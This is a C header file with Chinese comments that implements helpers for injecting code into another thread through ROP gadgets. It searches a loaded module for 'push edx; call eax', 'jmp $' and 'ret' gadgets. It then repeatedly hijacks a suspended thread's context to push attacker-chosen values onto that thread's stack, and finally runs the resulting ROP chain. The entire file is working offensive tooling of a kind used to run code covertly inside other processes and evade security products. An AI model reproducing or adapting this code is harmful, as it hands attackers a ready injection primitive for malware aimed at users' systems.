#ifndef HELPERS_H
#define HELPERS_H

#include <windows.h>
#include <stdio.h>

#define push(x) pushm(x, thd)

// Gadget 全局变量
unsigned int pshc; // push edx; call eax
unsigned int jmps; // jmp $
unsigned int ret;  // ret

// Gadget 查找函数
// 在指定模块的 .text 段中搜索指定字节序列
unsigned int findr(const unsigned char* pattern, int sz, const char* name) {
    void* base = GetModuleHandleA(name);
    unsigned char* ptr = (unsigned char*)base;

    // 定位到 .text 段（第一个节区，偏移 248）
    ptr += ((PIMAGE_SECTION_HEADER)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew + 248))->VirtualAddress;
    unsigned int virtsize = ((PIMAGE_SECTION_HEADER)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew + 248))->SizeOfRawData;

    unsigned int c = 0;
    while (memcmp(pattern, ptr + c, sz) != 0) {
        c++;
        if (c >= virtsize) return 0;
    }
    return (unsigned int)(ptr + c);
}

// 等待线程退出内核态
// 通过监控 UserTime 的增长来判断线程是否已从内核态返回用户态
void waitunblock(HANDLE thd) {
    FILETIME a, b, c, d;
    GetThreadTimes(thd, &a, &b, &c, &d);
    DWORD pt = d.dwLowDateTime;

    while (1) {
        Sleep(1);
        GetThreadTimes(thd, &a, &b, &c, &d);
        // 当 UserTime 增长超过 9 个单位时，说明线程在用户态执行（卡在 jmp $）
        if (d.dwLowDateTime - pt > 9) break;
        pt = d.dwLowDateTime;
    }
}

// 向目标线程栈 push 一个值
// 原理：通过 "push edx; call eax" gadget，EDX 是要 push 的值，EAX 是返回地址（jmp $）
unsigned int pushm(unsigned int data, HANDLE thd) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);

    ctx.Esp += 4;           // 先增加 ESP（因为 push 会减少 ESP）
    ctx.Eip = pshc;         // 设置 EIP 到 "push edx; call eax"
    ctx.Edx = data;         // EDX = 要 push 的值
    ctx.Eax = jmps;         // EAX = jmp $ 地址（call eax 会跳到这里）

    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);

    return ctx.Esp - 4;     // 返回 push 后的栈地址
}

// 向栈 push 值，同时获取上一个函数的返回值（EAX）
unsigned int getretpush(unsigned int data, HANDLE thd) {
    CONTEXT ctx2;
    SuspendThread(thd);
    ctx2.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx2);

    ctx2.Eip = pshc;
    unsigned int addr = ctx2.Eax;  // 保存 EAX（上一个函数的返回值）
    ctx2.Edx = data;
    ctx2.Eax = jmps;

    SetThreadContext(thd, &ctx2);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);

    return addr;
}

// 向栈 push 一个垃圾值（初始化栈操作）
void opening(HANDLE thd) {
    CONTEXT ctx;
    SuspendThread(thd);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);

    ctx.Edx = 0;
    ctx.Eip = pshc;
    ctx.Eax = jmps;

    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
}

// 执行准备好的 ROP 链
// 原理：设置 ESP 跳过一个 DWORD，然后执行 ret 指令弹出栈顶作为返回地址
void slay(HANDLE thd) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);

    ctx.Esp += 4;    // 跳过栈顶的 junk 值
    ctx.Eip = ret;   // 执行 ret，弹出栈顶作为新 EIP

    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
}

#endif // HELPERS_H
